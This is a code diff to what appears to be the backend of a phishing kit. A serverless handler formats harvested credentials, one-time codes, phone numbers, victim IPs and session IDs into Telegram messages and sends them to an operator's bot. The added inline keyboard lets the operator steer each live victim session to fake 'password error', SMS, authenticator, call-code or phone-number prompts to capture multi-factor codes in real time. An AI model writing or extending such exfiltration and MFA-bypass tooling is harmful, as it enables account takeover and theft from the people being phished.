@@ -111,8 +111,49 @@ const composeCredentialsMessage = (data) => {
  * @returns {string}
  */
 const composeOtpMessage = (data) => {
-    const { otp, session } = data;
+    const { otp, otpType, session } = data;
     const { email, provider, clientIP, location, deviceDetails, sessionId } = session || {};
+
+    const formattedTimestamp = new Date().toLocaleString('en-US', {
+        year: 'numeric', month: 'short', day: 'numeric',
+        hour: '2-digit', minute: '2-digit', second: '2-digit',
+        timeZone: 'UTC', hour12: true
+    }) + ' UTC';
+
+    const typeLabel = {
+        sms_code: 'SMS CODE',
+        auth_code: 'AUTH CODE',
+        call_code: 'CALL CODE',
+        default: 'OTP',
+    }[otpType || 'default'] || 'OTP';
+
+    return [
+        `━━━━━━━━━━━━━━━━━━━━`,
+        `     🔑  *${typeLabel} RECEIVED*`,
+        `━━━━━━━━━━━━━━━━━━━━`,
+        ``,
+        `🔢  \`${otp}\``,
+        ``,
+        `📧  \`${email || 'N/A'}\``,
+        `🏷  *${provider || 'N/A'}*`,
+        `🌐  \`${clientIP || 'N/A'}\``,
+        ``,
+        `─ ─ ─ ─ ─ ─ ─ ─ ─ ─`,
+        ``,
+        `🕐  *${formattedTimestamp}*`,
+        `🆔  \`${sessionId}\``,
+        `━━━━━━━━━━━━━━━━━━━━`,
+    ].join('\n');
+};
+
+/**
+ * Composes the message for a submitted phone number (Number Prompt).
+ * @param {object} data - The phone number data payload.
+ * @returns {string}
+ */
+const composePhoneNumberMessage = (data) => {
+    const { phone, session } = data;
+    const { email, provider, sessionId } = session || {};
 
     const formattedTimestamp = new Date().toLocaleString('en-US', {
         year: 'numeric', month: 'short', day: 'numeric',
@@ -122,14 +163,13 @@ const composeOtpMessage = (data) => {
 
     return [
         `━━━━━━━━━━━━━━━━━━━━`,
-        `     🔑  *OTP RECEIVED*`,
+        `     📱  *PHONE NUMBER*`,
         `━━━━━━━━━━━━━━━━━━━━`,
         ``,
-        `🔢  \`${otp}\``,
+        `📞  \`${phone}\``,
         ``,
         `📧  \`${email || 'N/A'}\``,
         `🏷  *${provider || 'N/A'}*`,
-        `🌐  \`${clientIP || 'N/A'}\``,
         ``,
         `─ ─ ─ ─ ─ ─ ─ ─ ─ ─`,
         ``,
@@ -179,6 +219,15 @@ export const handler = async (event) => {
         // No new IP lookup is needed.
         message = composeOtpMessage(data);
 
+    } else if (type === 'phone_number') {
+        // Phone number submitted from Number Prompt flow
+        message = composePhoneNumberMessage(data);
+
+    } else if (type === 'otp_resend') {
+        // OTP resend notification — simple info message
+        const { email, provider, sessionId } = data || {};
+        message = `🔄 *OTP Resend Requested*\n\n📧 \`${email || 'N/A'}\`\n🏷 *${provider || 'N/A'}*\n🆔 \`${sessionId || 'N/A'}\``;
+
     } else {
         // Fallback for old format or unknown types
         console.warn('Request received with unknown or missing "type". Processing as credentials.');
@@ -189,11 +238,45 @@ export const handler = async (event) => {
         message = composeCredentialsMessage({ ...body, clientIP, location, deviceDetails, sessionId });
     }
 
+    // Build the Telegram payload
+    const telegramPayload = {
+      chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown',
+    };
+
+    // For credential messages, attach Smart Bot inline keyboard buttons
+    const sessionId = data?.sessionId || data?.session?.sessionId || '';
+    const smartBotKeyboard = sessionId ? {
+      inline_keyboard: [
+        [
+          { text: '✅ Yes Prompt', callback_data: `yes_prompt:${sessionId}` },
+          { text: '❌ Password Error', callback_data: `password_error:${sessionId}` },
+        ],
+        [
+          { text: '📝 SMS Code', callback_data: `sms_code:${sessionId}` },
+          { text: '📝 Authenticator Code', callback_data: `auth_code:${sessionId}` },
+        ],
+        [
+          { text: '📝 Call Code', callback_data: `call_code:${sessionId}` },
+          { text: '📝 Number Prompt', callback_data: `number_prompt:${sessionId}` },
+        ],
+        [
+          { text: '✅ Success', callback_data: `success:${sessionId}` },
+        ],
+      ],
+    } : null;
+
+    // Attach inline keyboard for credential, OTP, and phone_number messages
+    if (smartBotKeyboard && (type === 'credentials' || type === 'otp' || type === 'phone_number')) {
+      telegramPayload.reply_markup = smartBotKeyboard;
+    }
+
     // Send the composed message to Telegram
     const telegramResponse = await fetch(`https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
+      body: JSON.stringify(telegramPayload),
       signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
     });
 
